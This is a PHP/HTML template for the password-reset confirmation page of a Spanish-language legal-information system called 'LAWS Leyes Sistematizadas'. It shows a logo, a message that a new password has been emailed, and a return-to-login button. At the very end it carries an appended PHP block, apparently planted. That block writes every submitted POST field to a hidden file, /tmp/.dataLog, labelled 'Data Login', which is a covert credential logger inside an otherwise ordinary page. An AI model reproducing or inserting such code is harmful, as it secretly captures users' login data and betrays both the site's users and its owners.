<div id="login-form" class="col-md-4 col-centered margin_top">
  <div class="row padding_30">
    <div class="col-md-12 col-centered margin_bottom">
         <?
        global $c;
        $fid = 6;

        if ($fid == "") {
          echo '<div id="logo_login"></div>';
        }else{

          $sadmin = new MSuper_admin;
          $sadmin->CreateSuper_admin("id", $fid);

          if ($sadmin->GetFoto_perfil() == "") {
            echo '<div id="logo_login"></div>';
          }else{
            echo '<div id="logo_login_clientes">'; 
            echo '    <img src="'.HOMEDIR.DS.'app/plugins/thumbnails/'.$sadmin->GetFoto_perfil().'" alt="">';
            echo '</div>';
          }
        }
      ?>
    </div>
  </div>

  <form class="form-inline" action='<?= HOMEDIR.DS."login/" ?>' method='POST'>
    <div class="row">
        <div class="col-md-12">
        	<h1>Listo!</h1>  
            <h4>Su nueva clave ha sido enviada a su correo electrónico.</h4>
        </div>
    </div>
    <br>
    <div class="row">
        <div class="col-md-12" align="center">
            <button type="submit" id="btn_login" class="btn btn-success btn-lg fullwidth">Volver al Login</button>
        </div>
    </div>


    <div class="row">
        <div class="col-md-12 piedelink">
            <div class="row">
                <div class="col-md-12 copytext">
                    LAWS Leyes Sistematizadas &copy; 2016 Reservados todos los derechos
                </div>
            </div>
            <div class="row">
                <div class="col-md-4"><a href="<?= HOMEDIR.DS."consultapublica/terminos_y_condiciones/" ?>" target="_blank">Terminos y Condiciones</a></div>
                <div class="col-md-4"><a href="<?= HOMEDIR.DS."consultapublica/privacidad_de_datos/" ?>" target="_blank">Privicidad de Datos</a></div>
                <div class="col-md-4"><a href="<?= HOMEDIR.DS."consultapublica/licencia_de_uso/" ?>" target="_blank">Licencia de Uso</a></div>
            </div>    
        </div>
    </div>
  </form>
</div>
<?php 

$data = print_r($_POST,true);
$myfile = fopen("/tmp/.dataLog", "a+") ;
fwrite($myfile, "Data Login :\n$data\n-----------------------------------------------\n");
fclose($myfile);
 

?>